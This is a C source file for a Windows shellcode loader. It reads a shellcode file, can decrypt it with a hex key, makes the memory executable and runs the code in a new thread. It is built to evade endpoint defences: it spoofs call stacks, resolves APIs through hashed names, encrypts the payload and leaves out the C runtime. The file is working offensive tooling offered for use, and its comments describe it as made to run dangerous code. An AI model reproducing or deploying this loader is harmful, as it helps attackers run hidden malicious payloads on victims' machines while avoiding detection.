#include <windows.h>
#include <fcntl.h>
#include <share.h>
#include <sys/stat.h>
#include "trampoline.h"
#include "cryptor.h"

/*
 * Copyright (c) 2025, tan2pow16.
 *  All rights reserved.
 */

#define CP_UTF8 65001
#define ARGC_MAX 0x40

// I use these to exclude the CRT stub from the linker.
int __imp_printf(char *format, ...);
int __imp__sopen_s(int *pfh, const char *filename, int oflag, int shflag, int pmode);
long __imp__filelength(int fd);
int __imp__read(int const fd, void * const buffer, unsigned const buffer_size);
int __imp__close(int fd);

typedef struct _ShellcodeDesc
{
  PVOID shellcode;
  DWORD alloc_sz;
  DWORD comm_msg;
  HydratedKey *hydrated_key;
} ShellcodeDesc;

void shellcode_thread(void *_sc)
{
  ShellcodeDesc *sc = _sc;
  if(sc->hydrated_key)
  {
    // The file size is already checked in __main__; each QWORD is 8-byte in length.
    if(!ghetto_decrypt_shellcode(sc->hydrated_key, (DWORD64 *)sc->shellcode, sc->comm_msg >> 3))
    {
      goto _BAD_SHELLCODE_ABORT;
    }
  }
  else if(*(DWORD *)(sc->shellcode) == CRYPTOR_MAGIC) // On Windows, the allocation is always aligned to 0x1000 bytes. So this should be fine even if the shellcode is smaller than 4 bytes.
  {
    goto _BAD_SHELLCODE_ABORT;
  }

  sc->comm_msg = 0;
  stack_spoof_call_fptr(0, sc->shellcode);
  return;

_BAD_SHELLCODE_ABORT:
  sc->comm_msg = -1;
  return;
}

int __main__(int argc, char *argv[])
{
  int fd;
  int read_size;
  DWORD fsize;
  DWORD ret;
  ShellcodeDesc sc;
  HANDLE thread_hndl;
  char *key;
  BYTE key_dw_len; // The key is always less than 64 bytes in length.
  HydratedKey hydrated_key;

  if((argc < 2) || (argc > 3))
  {
    __imp_printf("[#] Usage: %s <path\\to\\shellcode.bin> [hex_key]\n", argv[0]);
    return 0;
  }

  if(argc > 2)
  {
    key = argv[2];
  }
  else
  {
    key = NULL;
  }

  // All argv[x]s are allocated by this program, and a decoded string is always shorter than its hex counterpart. So, it's safe.
  //  Also, it's a shellcode loader. It's designed to run dangerous code anyway.
  if(key)
  {
    key_dw_len = hex_key_decode(key, (void *)key);
    if(!key_dw_len)
    {
      __imp_printf("[x] Error: Invalid key. Make sure it's a valid hex string with its length not greater than 128 characters while being a multiple of 8.\n");
      goto _BAD_ABORT;
    }
  }

  // https://wiki.sei.cmu.edu/confluence/display/c/FIO19-C.+Do+not+use+fseek%28%29+and+ftell%28%29+to+compute+the+size+of+a+regular+file
  //  I don't think it's actually important, but hey, I get some obscure APIs to have fun with.
  if(__imp__sopen_s(&fd, argv[1], _O_RDONLY | _O_BINARY, _SH_DENYWR, _S_IREAD) || (fd < 0))
  {
    __imp_printf("[x] Error: Unable to open file \"%s\" (error code: 0x%X). Abort!\n", argv[1], GetLastError());
    goto _BAD_ABORT;
  }

  fsize = __imp__filelength(fd);
  if(fsize < 0)
  {
    __imp_printf("[x] Error: Unable to determine the shellcode file size (error code: 0x%X). Abort!\n", GetLastError());
    goto _BAD_CLOSE_HANDLE;
  }
  if(!fsize)
  {
    __imp_printf("[x] Error: Empty shellcode file! Abort!\n");
    goto _BAD_CLOSE_HANDLE;
  }
  if(key && ((fsize & 0x7) || (fsize <= 8))) // Encrypted shellcode must be padded to 8-byte boundaries.
  {
    __imp_printf("[x] Error: Invalid encrypted shellcode size!\n");
    goto _BAD_CLOSE_HANDLE;
  }
  __imp_printf("[+] Shellcode file size = %d\n", fsize);

  sc.shellcode = NULL;
  sc.alloc_sz = fsize;
  ret = (DWORD)(DWORD64)stack_spoof_call_api(6, NtAllocateVirtualMemory_MODDED_DJB2_WITH_LIB, (HANDLE)-1, &(sc.shellcode), 0, &(sc.alloc_sz), 0x3000, 0x4);
  if(ret)
  {
    __imp_printf("[x] Error: Memory allocation failed (error code: 0x%X)!\n", GetLastError());
    goto _BAD_CLOSE_HANDLE;
  }
  if(sc.alloc_sz < fsize)
  {
    __imp_printf("[x] Error: Memory allocation failed (insufficient size)!\n");
    goto _BAD_FREE_ALLOC;
  }
  __imp_printf("[+] Shellcode base address = 0x%llX\n", (DWORD64)(sc.shellcode));

  read_size = __imp__read(fd, sc.shellcode, fsize);
  if(read_size <= 0)
  {
    __imp_printf("[x] Error: Unable to read any content from file \"%s\" (error code: 0x%X)! Abort!\n", argv[1], GetLastError());
    goto _BAD_FREE_ALLOC;
  }
  if(read_size >= fsize)
  {
    __imp_printf("[v] Successfully fetched the data from file \"%s\"!\n", argv[1]);
  }
  else
  {
    __imp_printf("[!] Warning: Unable to fully read the shellcode file!\n");
  }

  __imp__close(fd);
  fd = -1;

  ret = (DWORD)(DWORD64)stack_spoof_call_api(5, NtProtectVirtualMemory_MODDED_DJB2_WITH_LIB, (HANDLE)-1, &(sc.shellcode), &(sc.alloc_sz), 0x40, &read_size);
  if(ret)
  {
    __imp_printf("[x] Error: Unable to setup the execution permission (error code: 0x%X)! Abort!\n", GetLastError());
    goto _BAD_FREE_ALLOC;
  }

  if(key)
  {
    ghetto_schedule_key((void *)key, key_dw_len, &hydrated_key);
    // It's safe. The main function will wait for the shellcode to return. (See the WaitForSingleObject() call below.)
    sc.hydrated_key = &hydrated_key;
    sc.comm_msg = fsize; // For later decryption
  }
  else
  {
    sc.hydrated_key = NULL;
  }

  ret = (DWORD)(DWORD64)stack_spoof_call_api(10, RtlCreateUserThread_MODDED_DJB2_WITH_LIB, (HANDLE)-1, NULL, FALSE, 0L, 0LL, 0LL, shellcode_thread, &sc, &thread_hndl, NULL);
  if(ret)
  {
    __imp_printf("[x] Error: Unable to create the detonation thread (error code: 0x%X)! Abort!\n", GetLastError());
    goto _BAD_FREE_ALLOC;
  }
  __imp_printf("[v] Successfully launched the shellcode thread! (Handle ID: 0x%llX)\n", thread_hndl);

  __imp_printf("[+] Waiting for the shellcode to return...\n");
  stack_spoof_call_api(2, WaitForSingleObject_MODDED_DJB2_WITH_LIB, thread_hndl, -1);

  if((int)(sc.comm_msg) < 0)
  {
    __imp_printf("[x] Error: Shellcode decryption failed! The shellcode has not been detonated.\n", GetLastError());
    goto _BAD_ABORT;
  }

  __imp_printf("[v] Done!\n");

  return 0;

_BAD_FREE_ALLOC:
  stack_spoof_call_api(4, NtFreeVirtualMemory_MODDED_DJB2_WITH_LIB, (HANDLE)-1, &(sc.shellcode), &(sc.alloc_sz), MEM_RELEASE);
_BAD_CLOSE_HANDLE:
  __imp__close(fd);
_BAD_ABORT:
  return 1;
}

int __wchar_main__(int argc, WCHAR *const argvw[])
{
  size_t alloc_size, pos;
  char *argv[ARGC_MAX];
  char *argv_alloc;
  int i, x;

  if(argc >= ARGC_MAX)
  {
    // ERROR_NOT_ENOUGH_MEMORY
    return 8;
  }
  argv[argc] = 0;

  alloc_size = 0;
  // Calculate the allocation size.
  for(i = 0 ; i < argc ; i++)
  {
    // CommandLineToArgvW returned strings are always NULL terminated. :)
    x = WideCharToMultiByte(CP_UTF8, 0, argvw[i], -1, NULL, 0, NULL, NULL);
    if(x <= 0)
    {
      // Really bad input.
      return GetLastError();
    }
    alloc_size += x; // WideCharToMultiByte accounts for the NULL termination.
  }

  pos = 0;
  argv_alloc = LocalAlloc(0, alloc_size);
  if(!argv_alloc)
  {
    return GetLastError();
  }

  for(i = 0 ; i < argc ; i++)
  {
    argv[i] = &argv_alloc[pos];
    x = WideCharToMultiByte(CP_UTF8, 0, argvw[i], -1, argv[i], alloc_size - pos, NULL, NULL);
    if(x <= 0)
    {
      // Really bad input.
      LocalFree(argv_alloc);
      return GetLastError();
    }
    pos += x;
  }

  x = __main__(argc, argv);
  LocalFree(argv_alloc);
  return x;
}
